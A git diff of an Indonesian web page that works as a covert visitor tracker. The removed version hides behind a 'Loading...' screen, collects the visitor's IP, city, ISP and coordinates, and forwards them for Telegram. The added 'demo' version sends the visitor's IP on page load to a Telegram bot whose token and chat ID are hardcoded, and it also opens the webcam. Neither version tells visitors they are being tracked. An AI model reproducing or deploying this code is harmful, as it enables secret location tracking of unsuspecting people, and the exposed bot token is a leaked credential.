@@ -1,53 +1,54 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Loading...</title>
+  <title>Project Demo Web + Telegram</title>
 </head>
 <body>
-  <h3>Mohon tunggu...</h3>
-  <pre id="ip-info">Loading IP...</pre>
+  <h1>Demo: IP & Kamera (dengan izin)</h1>
+  <p id="ip-info">Mendeteksi IP...</p>
+  <video id="video" width="400" autoplay></video>
 
   <script>
-    async function getIP() {
-      try {
-        // Ambil IP target & geolocation dari ipwho.is
-        const res = await fetch("https://ipwho.is/");
-        const data = await res.json();
+    // ======== Bagian 1: Ambil IP Publik ========
+    let userIP = '';
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        userIP = data.ip;
+        document.getElementById('ip-info').textContent = `IP Kamu: ${userIP}`;
+        sendToTelegram(userIP); // Kirim ke Telegram
+      })
+      .catch(err => {
+        document.getElementById('ip-info').textContent = 'Gagal mendapatkan IP';
+      });
 
-        const info = `
-📡 IP Terdeteksi
-🌐 IP: ${data.ip}
-🌍 Negara: ${data.country || "Unknown"}
-🏙 Kota: ${data.city || "Unknown"}, ${data.region || "Unknown"} ${data.postal || ""}
-🛰 ISP: ${data.connection?.isp || "Unknown"}
-🏢 Org: ${data.connection?.org || "Unknown"}
-⚡ ASN: ${data.connection?.asn || "Unknown"}
-⌚ Zona Waktu: ${data.timezone?.id || "Unknown"}
-📌 Koordinat: ${data.latitude || "Unknown"},${data.longitude || "Unknown"}
-🔗 https://www.google.com/maps?q=${data.latitude || ""},${data.longitude || ""}
-        `;
+    // ======== Bagian 2: Akses Kamera (dengan izin) ========
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        document.getElementById('video').srcObject = stream;
+      })
+      .catch(function(error) {
+        console.error('Akses kamera ditolak atau gagal:', error);
+      });
 
-        // Tampilkan di halaman
-        document.getElementById("ip-info").textContent = info;
+    // ======== Bagian 3: Kirim ke Bot Telegram ========
+    function sendToTelegram(ip) {
+      const token = '8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY';         // Ganti dengan token bot kamu
+      const chat_id = '7600526426';         // Ganti dengan chat ID kamu
+      const time = new Date().toLocaleString();
+      const message = `📡 Pengunjung Baru:\n\n🌐 IP: ${ip}\n🕒 Waktu: ${time}`;
 
-        // Kirim ke server untuk dikirim ke Telegram
-        const sendRes = await fetch("/api/send", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ text: info })
-        });
-
-        const result = await sendRes.json();
-        console.log("Telegram send result:", result);
-
-      } catch (err) {
-        console.error("Error:", err);
-        document.getElementById("ip-info").textContent = "Error: " + err.message;
-      }
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      });
     }
-
-    getIP();
   </script>
 </body>
 </html>
